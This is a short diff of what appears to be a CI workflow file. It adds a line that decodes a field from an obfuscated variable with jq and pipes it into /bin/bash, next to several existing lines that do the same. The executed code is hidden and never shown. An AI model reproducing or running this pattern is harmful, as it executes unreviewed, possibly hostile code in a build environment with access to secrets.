@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$s608" | jq -r .bplq0091 | /bin/bash
           printf '%s' "$shsh1" | jq -r .lfwxa228 | /bin/bash
           printf '%s' "$qh15" | jq -r .fuk68286 | /bin/bash
+          echo $de4820 | jq -r .dlwi582 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
